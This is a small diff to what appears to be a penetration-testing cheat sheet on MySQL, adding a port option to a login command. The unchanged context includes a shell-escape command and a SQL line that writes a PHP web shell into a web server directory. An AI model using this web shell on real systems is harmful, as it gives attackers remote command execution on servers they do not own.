@@ -5,11 +5,12 @@ For `mysql` including [[MariaDB-Hacking]]:
 ```bash
 mysql -u $username -p $password -h $HOST
 mysql -u root -h $HOST
+mysql -u root -h $HOST -P $port
 
 mysql>\! sh # run a sh shell from mysql!
 ```
 
-## INTO SHELL Shell
+## `INTO SHELL` Shell
 ```sql
 -- PHP
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
